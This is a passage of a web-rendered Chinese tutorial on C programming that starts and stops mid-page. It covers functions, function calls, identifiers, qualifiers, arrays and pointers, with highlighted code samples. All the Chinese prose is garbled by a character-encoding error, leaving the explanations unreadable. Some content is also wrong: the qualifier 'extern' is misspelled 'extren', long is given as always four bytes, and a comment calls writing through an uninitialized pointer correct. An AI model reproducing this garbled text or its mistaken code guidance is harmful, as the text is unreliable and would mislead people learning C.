class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªè¿‡ç¨‹ï¼ˆåœ¨Cè¯­è¨€ä¸­çš„å‡½æ•°ï¼‰éœ€è¦è¿”å›ç±»å‹ï¼Œè¿‡ç¨‹åï¼Œä¼ å…¥å‚æ•°å’Œå‡½æ•°ä½“ã€‚</p><p>ä¸Šé¢çš„ä¾‹å­æ ‡è¯†äº†å‡½æ•°å¦‚ä½•å®šä¹‰ã€‚</p><ul><li><code>return_type</code> è¡¨ç¤ºè¿”å›å€¼çš„ç±»å‹(å…·ä½“è§0x03)</li><li><code>identifier</code> æ˜¯ä½ ä¸ºè¿™ä¸ªå‡½æ•°æ ‡è¯†çš„åå­—ï¼ˆæ ‡è¯†ç¬¦ï¼‰</li><li><code>type parameter</code> å³æ‹¬å·ä¸­çš„å†…å®¹æ˜¯ä¼ å…¥çš„å‚æ•°ç±»å‹å’Œä¼ å…¥å€¼çš„æ ‡è¯†ç¬¦ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥å¡«voidï¼Œæ ‡è¯†ä¸ºç©º(å…·ä½“è§0x03)</li><li><code>function body</code> å‡½æ•°ä½“ï¼Œä½ ä¼šåœ¨è¿™é‡Œå†™è¿™ä¸ªè¿‡ç¨‹éœ€è¦å¹²ä»€ä¹ˆï¼Œå°±åƒä¸Šé¢çš„mainå‡½æ•°ä¸€æ ·</li></ul><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼šæ¯ä¸ªCè¯­è¨€ç¨‹åºéƒ½éœ€è¦ä¸€ä¸ªmainå‡½æ•°ä½œä¸ºç”¨æˆ·è‡ªå®šä¹‰è¿‡ç¨‹çš„å…¥å£ç‚¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç”¨æˆ·æ‰“å¼€ä¸€ä¸ªCç¨‹åºï¼ŒCPUä»startå‡½æ•°ï¼ˆè‡ªåŠ¨ç”Ÿæˆçš„ï¼‰å¼€å§‹åˆå§‹åŒ–æ‰€æœ‰éœ€è¦çš„ç¯å¢ƒï¼ŒæˆåŠŸåï¼Œè‡ªåŠ¨è°ƒç”¨mainå‡½æ•°ä»è€Œæ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„è¿‡ç¨‹ï¼Œmainå‡½æ•°ç»“æŸåï¼Œå†è‡ªåŠ¨å›æ”¶/æ¸…ç†ç¯å¢ƒå†…å®¹ç„¶åç»“æŸç¨‹åºã€‚</p><h3 id="02-è°ƒç”¨ä¸€ä¸ªè¿‡ç¨‹">02 è°ƒç”¨ä¸€ä¸ªè¿‡ç¨‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c = add(a,b);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ˜¯æŒ‡ï¼šè¿›å…¥ä¸€ä¸ªè¿‡ç¨‹å¹¶å®Œæˆå®ƒï¼Œåœ¨Cè¯­è¨€ä¸­è¿˜æœ‰è®¡ç®—å‡ºå®ƒçš„è¿”å›å€¼çš„å«ä¹‰</p><p>è¿™ä¸ªä¾‹å­ä¸­ï¼Œscanfå’Œprintfå’Œaddå°±æ˜¯è¢«è°ƒç”¨çš„è¿‡ç¨‹ã€‚ä»¥addä¸¾ä¾‹ï¼ŒCPUæ‰§è¡Œåˆ°è¿™é‡Œï¼Œä¼šå…ˆè¿›å…¥addè¿‡ç¨‹ï¼Œç„¶åä¸€æ¡ä¸€æ¡æ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œè¿”å›å‡ºè®¾å®šçš„å€¼ã€‚å‡½æ•°è°ƒç”¨çš„æ ¼å¼å³æ˜¯identifier(parameters)ï¼Œå†æ¬¡è¯´æ˜ï¼šå®ƒçš„å«ä¹‰å°±æ˜¯è®¡ç®—å‡ºè¿™ä¸ªè¿‡ç¨‹çš„è¿”å›å€¼ï¼Œä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„æœ¬è´¨å°±æ˜¯å¾—åˆ°å®ƒçš„å€¼ã€‚å¯¹äºprintfè¿™ç±»å«æœ‰å‰¯ä½œç”¨çš„å‡½æ•°ï¼Œå®ƒä»¬ä¼šåœ¨è®¡ç®—è¿”å›å€¼çš„è¿‡ç¨‹ä¸­â€œé¡ºå¸¦â€è¡¨ç°å‰¯ä½œç”¨ã€‚</p><h2 id="0x03-å‚æ•°ï¼Œè®¡ç®—ï¼Œè¡¨è¾¾å¼å’Œè¯­å¥">0x03 å‚æ•°ï¼Œè®¡ç®—ï¼Œè¡¨è¾¾å¼å’Œè¯­å¥</h2><p>åˆšåˆšè¯´æ˜äº†å‡½æ•°çš„æœ¬è´¨å°±æ˜¯è¿”å›å€¼ï¼Œé‚£ä¹ˆå¯¹äºCè¯­è¨€æ¥è¯´ï¼Œæ·»åŠ /åˆ é™¤/ä¿®æ”¹â€å€¼â€œå°±æ˜¯Cç¨‹åºçš„æœ¬èŒå·¥ä½œã€‚è¿™ä¸€ç« å°±ä»‹ç»ä¸€ä¸‹ï¼ŒCè¯­è¨€å¦‚ä½•æ“ä½œå€¼</p><h3 id="00-æ ‡è¯†ç¬¦">00 æ ‡è¯†ç¬¦</h3><p>åœ¨è®¡ç®—æœºçš„åº•å±‚å®ç°ä¸­ï¼Œä»»ä½•ä¸€ä¸ªå†…å­˜åœ°å€éƒ½å¯¹åº”ä¸€ä¸ªå€¼ï¼ŒCè¯­è¨€é€šè¿‡ä½¿ç”¨æ ‡è¯†ç¬¦çš„æ–¹æ³•æ¥ç®€åŒ–å¯¹å†…å­˜ç©ºé—´çš„æ“ä½œã€‚ç°åœ¨å¯ä»¥å‡è®¾å†…å­˜åœ°å€æ˜¯ä¸€ä¸ªè¡—é“çš„æ‰€æœ‰é—¨ç‰Œå·ï¼Œåœ°å€å¯¹åº”çš„å€¼æ˜¯é—¨ç‰Œå·å†…çš„ä¸œè¥¿ã€‚</p><p>åœ¨æ±‡ç¼–ä¸­å®ç°ä¸¤æ•°ç›¸åŠ çš„è¿ç®—è¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;çœç•¥</span><br><span class="line">mov [rsp+4],4;åœ¨æ ˆå¯¹åº”çš„å†…å­˜åœ°å€æ”¾ç½®ä¸€ä¸ªå€¼</span><br><span class="line">mov rax,3;å¦å¤–ä¸€ä¸ªæ“ä½œæ•°æ”¾åˆ°åŠ æ³•å¯„å­˜å™¨ä¸­</span><br><span class="line">add rax,[rsp+4];æ‰§è¡ŒåŠ æ³•æ“ä½œ</span><br><span class="line">mov rax,rax;æŠŠè¿”å›å€¼æ”¾åˆ°raxå¯„å­˜å™¨ä¸­ï¼Œç”¨äºè¿”å›ï¼Œè¿™ä¸ªæ­¥éª¤å¯èƒ½è¢«ä¼˜åŒ–</span><br><span class="line">;çœç•¥</span><br></pre></td></tr></table></figure><p>åœ¨Cè¯­è¨€ä¸­å®ç°ä¸¤æ•°ç›¸åŠ çš„è¿ç®—è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼ŒCè¯­è¨€çœç•¥äº†å¯¹æ ˆç©ºé—´/å†…å­˜åœ°å€ä»¥åŠå¯„å­˜å™¨çš„æè¿°ï¼Œå°†æˆ‘ä»¬çš„ç²¾åŠ›æ”¾åˆ°äº†å®ç°æ•ˆæœä¸Šã€‚å…¶ä¸­çš„aå’Œbè¢«å«åšæ ‡è¯†ç¬¦ï¼Œå®ƒä»¬ä»£è¡¨äº†å†…å­˜ç©ºé—´çš„æŸä¸ªåœ°å€ï¼ˆè¿™æ—¶åˆå¯ä»¥è¢«å«åšå˜é‡ï¼‰ã€‚æ ‡è¯†ç¬¦å³æ˜¯å†…å­˜ç©ºé—´ä¸€ä¸ªåŒºåŸŸçš„ä»£å·ï¼Œæ˜¯ä¾›æˆ‘ä»¬æ“ä½œå…¶ä¸­å€¼çš„ä¸­ä»‹</p><h3 id="01-å£°æ˜ä¸€ä¸ªæ ‡è¯†ç¬¦">01 å£°æ˜ä¸€ä¸ªæ ‡è¯†ç¬¦</h3><h4 id="1å•ç‹¬å£°æ˜">1å•ç‹¬å£°æ˜</h4><p>åŸºæœ¬æ ¼å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier;</span><br><span class="line"><span class="comment">//ç‰¹æ®Šå†™æ³•</span></span><br><span class="line"><span class="type">int</span> a,b,c;<span class="comment">//è¿ç»­å£°æ˜</span></span><br></pre></td></tr></table></figure><p><code>type</code>ï¼šè¯´æ˜è¿™ä¸ªæ ‡è¯†ç¬¦å¯¹åº”ç©ºé—´çš„å¤§å°å’Œé»˜è®¤çš„ç±»å‹ï¼Œå…¶ä¸­é»˜è®¤ç±»å‹å½±å“è¿ç®—æ•ˆæœï¼Œè™½ç„¶å¯ä»¥å¼ºåˆ¶ç±»å‹è½¬åŒ–ï¼Œä½†æ˜¯è¿˜æ˜¯å°½é‡åœ¨å®šä¹‰æ—¶å°±å†™å¥½</p><table><thead><tr><th>type</th><th>å¤§å°</th><th>é»˜è®¤ç±»å‹</th></tr></thead><tbody><tr><td>char</td><td>1å­—èŠ‚</td><td>æœ‰ç¬¦å·å­—ç¬¦å‹</td></tr><tr><td>short</td><td>2å­—èŠ‚</td><td>æœ‰ç¬¦å·çŸ­æ•´å‹</td></tr><tr><td>int</td><td>4å­—èŠ‚</td><td>æœ‰ç¬¦å·æ•´å‹</td></tr><tr><td>long</td><td>4å­—èŠ‚</td><td>æœ‰ç¬¦å·é•¿æ•´å‹</td></tr><tr><td>long long</td><td>8å­—èŠ‚</td><td>æœ‰ç¬¦å·é•¿é•¿æ•´å½¢</td></tr><tr><td>bool</td><td>1å­—èŠ‚</td><td>åªå­˜æ”¾0å’Œ1ï¼ŒC23</td></tr></tbody></table><p><code>identifier</code>ï¼šä¸€ä¸ªä½ å®šä¹‰çš„åå­—ï¼Œç”¨æ¥æ ‡è¯†è¿™å—åŒºåŸŸï¼Œä¹‹åå¯¹è¿™å—åŒºåŸŸçš„æ“ä½œè½¬æ¢ä¸ºå¯¹è¿™ä¸ªæ ‡è¯†ç¬¦çš„æ“ä½œã€‚å†…å®¹å¿…é¡»ä¸ºï¼šå¤§å°å†™å­—æ¯å’Œæ•°å­—å’Œä¸‹åˆ’çº¿çš„ç»„åˆã€‚ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Œä¸èƒ½å’Œå·²æœ‰å†…å®¹é‡åï¼ˆåŒä¸€ä½œç”¨åŸŸä¸‹ä¹‹å‰çš„æ ‡è¯†ç¬¦ï¼Œå…³é”®å­—ï¼ˆæ¯”å¦‚char returnï¼‰ï¼‰</p><p><code>&lt;qualifier&gt;</code>ï¼šå¯é€‰çš„é™å®šç¬¦ï¼Œå¯ä»¥å†™å¤šä¸ªå†…å®¹ã€‚</p><table><thead><tr><th>qualifier</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>signed</td><td>è¡¨æ˜è¿™ä¸ªåŒºåŸŸçš„å€¼é»˜è®¤ä¸ºæœ‰ç¬¦å·ï¼Œçœç•¥é»˜è®¤ä¸ºsigned</td></tr><tr><td>unsigned</td><td>è¡¨æ˜è¿™ä¸ªåŒºåŸŸçš„å€¼é»˜è®¤ä¸ºæ— ç¬¦å·ï¼Œä½¿ç”¨unsignedæ—¶çœç•¥typeè¡¨æ˜æ˜¯æ— ç¬¦å·æ•´å‹</td></tr><tr><td>const</td><td>è¡¨æ˜è¿™ä¸ªåŒºåŸŸçš„å€¼é™¤äº†åˆå§‹èµ‹å€¼å¤–ä¸å¯æ›´æ”¹ï¼Œå£°æ˜æ—¶å¿…é¡»ç›´æ¥èµ‹å€¼</td></tr><tr><td>volatile</td><td>ä¸å»ºè®®ç¼–è¯‘å™¨ä¼˜åŒ–è¿™ä¸ªåŒºåŸŸçš„æ“ä½œ</td></tr><tr><td>extren</td><td>è¡¨æ˜è¿™ä¸ªå˜é‡æ¥è‡ªå…¶å®ƒæºä»£ç æ–‡ä»¶</td></tr><tr><td>static</td><td>è¡¨æ˜è¿™ä¸ªå˜é‡ä¸èƒ½è¢«extrenï¼Œåªèƒ½åœ¨æœ¬æ–‡ä»¶ä½¿ç”¨</td></tr><tr><td>auto</td><td>è¡¨æ˜è¿™ä¸ªå˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œå—ä½œç”¨åŸŸï¼Œçœç•¥é»˜è®¤ä¸ºauto</td></tr><tr><td>register</td><td>å»ºè®®ç¼–è¯‘å™¨æŠŠè¿™ä¸ªå€¼æ”¾åˆ°å¯„å­˜å™¨</td></tr></tbody></table><h4 id="2å£°æ˜æ—¶èµ‹å€¼">2å£°æ˜æ—¶èµ‹å€¼</h4><p>ä¸€ä¸ªåŒºåŸŸåªå£°æ˜ï¼Œå…¶ä¸­çš„å†…å®¹æ˜¯ä¸ä¼šå› ä¸ºä½ ç»™äº†è¿™ä¸ªåŒºåŸŸä¸€ä¸ªåå­—è€Œæ”¹å˜çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬åœ¨å£°æ˜æ—¶ç›´æ¥èµ‹å€¼ã€‚</p><p>åŸºæœ¬æ ¼å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier=number;</span><br><span class="line"><span class="comment">//ç‰¹æ®Šå†™æ³•ï¼Œè¿ç»­èµ‹å€¼</span></span><br><span class="line"><span class="keyword">auto</span> a=<span class="number">1</span>,b=<span class="number">4</span>,c=<span class="number">0</span>;<span class="comment">//autoåªèƒ½èµ‹å€¼ä¸€ç§ç±»å‹</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„=ä¸ºèµ‹å€¼å·ï¼Œä½œç”¨æ˜¯æŠŠæ•´ä¸ªç­‰å¼å³è¾¹çš„å€¼è®¡ç®—å‡ºæ¥ç»™å·¦è¾¹ã€‚å½¢å¦‚a=bè¿™æ ·çš„å¼å­è¢«å«åšè¡¨è¾¾å¼ï¼Œå’Œå‡½æ•°ç±»ä¼¼ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¯¹äºèµ‹å€¼æ¥è¯´ï¼Œå‰¯ä½œç”¨æ˜¯æŠŠå³è¾¹çš„å€¼ç»™å·¦è¾¹ï¼Œè¿”å›å€¼æ˜¯ç»“æŸåå·¦è¾¹çš„ç©ºé—´ä¸­çš„å€¼ã€‚</p><p>æ‰€ä»¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=b=c=d=e=f=<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>çš„æ•ˆæœå°±æ˜¯å…ˆè®©fç­‰äº5ï¼Œå†è®©eç­‰äºï¼ˆf=5ï¼‰è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼å³5ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°a=5.</p><p>å¤§å®¶ä¹Ÿå‘ç°ï¼Œå¯¹äºèµ‹å€¼ç¬¦å·ï¼Œå·¦è¾¹ä¸€å®šæ˜¯ä¸€ä¸ªç©ºé—´ï¼Œå³è¾¹åˆ™ä¸ä¸€å®šï¼Œç©ºé—´ä¸ä¸€å®šåœ¨å·¦ä¾§ï¼Œä½†æ˜¯æ•°ä¸€å®šåœ¨å³ä¾§ã€‚ä¸ºäº†ç®€ä¾¿æè¿°ï¼Œæˆ‘ä»¬æŠŠå¯ä»¥åœ¨èµ‹å€¼å·å·¦è¾¹çš„å€¼ï¼ˆæ ‡è¯†ç©ºé—´çš„ï¼‰ç§°ä¸º<code>å·¦å€¼</code>ï¼Œè€Œä¸å¯ä»¥åœ¨å·¦è¾¹çš„å€¼ï¼ˆåªèƒ½è§†ä¸ºæ•°çš„ï¼‰è¢«ç§°ä¸º<code>å³å€¼</code></p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=b=c=d=e=f=<span class="number">5</span>;<span class="comment">//a,b,c,d,e,fä¸ºå·¦å€¼ï¼Œ5ï¼Œf=5ï¼Œe=f=5ï¼Œd=e=f=5ï¼Œc=d=e=f=5ï¼Œb=c=d=e=f=5ï¼Œa=b=c=d=e=f=5ä¸ºå³å€¼</span></span><br><span class="line">c = add(a,b)-d;<span class="comment">//a,b,c,dä¸ºå·¦å€¼ï¼Œadd(a,b)ï¼Œadd(a,b)-dï¼Œc = add(a,b)-dä¸ºå³å€¼</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå£°æ˜æ—¶èµ‹å€¼ï¼Œnumberå¯ä»¥æ˜¯å·¦å€¼ä¹Ÿå¯ä»¥æ˜¯å³å€¼ã€‚è€Œå‰é¢çš„é™å®šç¬¦å’Œç±»å‹æè¿°ç¬¦å‡å’Œèµ‹å€¼ç›¸åŒã€‚</p><p>ç‰¹åˆ«çš„ï¼Œå£°æ˜æ—¶èµ‹å€¼å¯ä»¥ä½¿ç”¨è¿™æ ·çš„æ–¹æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> a=<span class="number">1</span>;<span class="comment">//é»˜è®¤int</span></span><br><span class="line"><span class="keyword">auto</span> b=<span class="number">0.1f</span>;<span class="comment">//é»˜è®¤float</span></span><br><span class="line"><span class="keyword">auto</span> c=<span class="number">8.9</span>;<span class="comment">//é»˜è®¤double</span></span><br></pre></td></tr></table></figure><p>C23å¼•å…¥äº†è¿™ç§å†™æ³•,autoè‡ªåŠ¨åˆ¤æ–­ç±»å‹ï¼Œç”šè‡³å¯ä»¥æŠŠå‡½æ•°è¿”å›å€¼è®¾ä¸ºautoå¯ç”¨è‡ªåŠ¨æ¨æ–­ã€‚</p><h4 id="3-å£°æ˜æ•°ç»„">3 å£°æ˜æ•°ç»„</h4><p>å‡è®¾æˆ‘çš„ç¨‹åºéœ€è¦100ä¸ªå˜é‡ï¼Œéš¾é“æˆ‘è¦å†™100ä¸ªauto a,b,c,d,â€¦å—ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼Œé€šè¿‡æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç³»ç»Ÿç”³è¯·ä¸€å—è¿ç»­çš„å†…å­˜ç”¨æ¥å­˜æ”¾æˆ‘ä»¬çš„å¤šä¸ªå˜é‡ã€‚</p><p>å£°æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier[size];</span><br><span class="line"><span class="type">int</span> arr[<span class="number">100</span>];</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„type identifier[size]å°±æ˜¯è¿ç»­ç”³è¯·sizeä¸ªtypeå¤§å°çš„ç©ºé—´çš„æ„æ€ã€‚è¿™ä¸ªç©ºé—´çš„åå­—å°±æ˜¯identifierã€‚å¦‚æœå†™æˆç»“æ„ä½“ï¼Œç±»ä¼¼è¿™æ ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arr</span>&#123;</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line">...<span class="comment">//ä¸€å…±100ä¸ª</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥è¿™æ ·èµ‹å€¼å’Œåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//åˆå§‹åŒ–ä¸º0</span></span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;&#125;; <span class="comment">//åˆå§‹åŒ–ä¸º0ï¼Œä»C23å¼€å§‹</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„0,1ç”¨äºæŒ‡å®šä»arrå¼€å§‹æˆ‘ä»¬ç”³è¯·çš„ç¬¬å‡ ä¸ªtypeé•¿åº¦çš„å°ç©ºé—´ï¼Œ[]ä¸­çš„æ•°æˆ‘ä»¬ç§°ä¸ºä¸‹æ ‡ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹æ ‡å»è®¿é—®æ•°ç»„çš„å€¼ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„æ•°ç»„ä¸‹è¡¨æ”¯æŒå˜é‡å—ï¼Œå›ç­”æ˜¯è‚¯å®šçš„ã€‚æˆ‘ä»¬å¯ä»¥è¿™æ ·ä½¿ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">arr[a] = <span class="number">1</span>; <span class="comment">//è®²arr[0]çš„å€¼æ”¹ä¸º1,å› ä¸ºaæ˜¯0</span></span><br></pre></td></tr></table></figure><p>å…¶å®ï¼Œå¯ä»¥æŠŠå†…å­˜å½“ä½œä¸€ä¸ªè¶…é•¿çš„æ•°ç»„ï¼Œæ¯ä¸ªåœ°å€éƒ½æ˜¯ä¸€ä¸ªä¸‹æ ‡ï¼Œè®¿é—®åœ°å€0x10000æ—¶ï¼Œå¯ä»¥ç†è§£ä¸ºå–memory[0x10000]ä¸­å­˜æ”¾çš„å€¼ã€‚Cè¯­è¨€è™½ç„¶æ²¡æœ‰ç›´æ¥å®šä¹‰ä¸€ä¸ªmemoryæ•°ç»„æ¥è®©æˆ‘ä»¬ç›´æ¥æ“ä½œï¼Œä½†æ˜¯æä¾›äº†ä¸€ä¸ªé¢å¤–çš„ç±»å‹å’Œæ“ä½œç¬¦*&amp;ï¼ˆè§£å¼•ç”¨è¿ç®—ç¬¦å’Œå–å€è¿ç®—ç¬¦ï¼‰æ¥è®©æˆ‘ä»¬è‡ªç”±åœ°ä½¿ç”¨å†…å­˜ï¼Œé‚£å°±æ˜¯<code>æŒ‡é’ˆ</code>ï¼ŒæŒ‡é’ˆå°±ç›¸å½“äºmemoryæ•°ç»„çš„ä¸‹æ ‡</p><h4 id="4-å£°æ˜æŒ‡é’ˆ">4 å£°æ˜æŒ‡é’ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type *identifier;</span><br><span class="line"><span class="type">int</span> *ptr;<span class="comment">//å£°æ˜ä¸€ä¸ªæŒ‡å‘intå‹æ•°æ®çš„æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ“ä½œmemory[0x10000]</span></span><br><span class="line">ptr = (<span class="type">int</span>*)<span class="number">0x10000</span>;<span class="comment">//è¿™é‡ŒåŸæ¥çš„æ•°æ®æ˜¯intå‹ï¼Œå’ŒæŒ‡é’ˆç±»å‹ä¸åŒï¼Œæ‰€ä»¥è¦å…ˆè¿›è¡Œè½¬æ¢</span></span><br><span class="line">*ptr = <span class="number">100</span>;<span class="comment">//ç­‰ä»·äºmemory[0x10000]=100;</span></span><br><span class="line"><span class="type">int</span> a = *ptr;<span class="comment">//ç­‰ä»·äºa = memory[0x10000];</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸Šçš„æ–¹æ³•å¯ä»¥å®ç°è‡ªç”±æ“ä½œå†…å­˜åœ°å€çš„å€¼ã€‚</p><p>ä½ å¯èƒ½ä¼šå¥½å¥‡ï¼ŒæŒ‰ä¸Šé¢æ‰€è¯´ptrç›´æ¥è¡¨ç¤ºäº†ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦æ·»åŠ typeæ ‡è¯†æ¥è¡¨ç¤ºå®ƒæŒ‡å‘ç©ºé—´çš„ç±»å‹å‘¢ã€‚å…¶å®è¿™ä¹Ÿå¾ˆå¥½ç†è§£ã€‚å†…å­˜æ˜¯è¿ç»­çš„å­—èŠ‚æ•°ç»„ï¼Œä½†æ˜¯ä½¿ç”¨æ—¶å¹¶ä¸ä¸€å®šæŒ‰å­—èŠ‚ä½¿ç”¨ï¼Œå¦‚æœè¿™é‡Œçš„ç©ºé—´æ˜¯ä½ ç»™<code>int a</code>ç”Ÿæˆçš„ç©ºé—´ï¼Œé‚£è¿™ä¸ªç©ºé—´è‚¯å®šæ˜¯intå‹çš„ï¼Œä½ å¦‚æœæŒ‰charæ¥ä½¿ç”¨ï¼Œé‚£å°±ä¼šé”™è¯¯ã€‚</p><p>å¥½äº†ï¼Œæˆ‘ä»¬äº†è§£äº†æŒ‡é’ˆå¦‚ä½•èµ‹å€¼äº†ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘æƒ³è¦æŒ‡å‘ä¸€ä¸ªå·²ç»ç”Ÿæˆçš„æ ‡è¯†ç¬¦çš„åœ°å€ï¼Œåˆè¯¥æ€ä¹ˆèµ‹å€¼å‘¢ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†å¦ä¸€ä¸ªè¿ç®—ç¬¦&amp;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *ptr;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">ptr = a;<span class="comment">//é”™è¯¯ï¼Œä¸èƒ½æŠŠä¸€ä¸ªæ•°èµ‹ç»™æŒ‡é’ˆï¼ˆæˆ–è€…è¯´å†…å­˜æ•°ç»„çš„ä¸‹æ ‡ï¼‰</span></span><br><span class="line">*ptr = a;<span class="comment">//æ­£ç¡®ï¼Œå¯ä»¥æŠŠæ•°èµ‹ç»™æŒ‡é’ˆæŒ‡å‘çš„åœ°å€(ç­‰ä»·memory[ptr]=a)</span></span><br><span class="line">ptr = &amp;a;<span class="comment">//æ­£ç¡®ï¼Œå¯¹æ ‡è¯†ç¬¦ä½¿ç”¨&amp;å–å€è¿ç®—ç¬¦å–å¾—ç›®æ ‡æ ‡è¯†ç¬¦åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åèµ‹ç»™æŒ‡é’ˆï¼Œè¿™æ 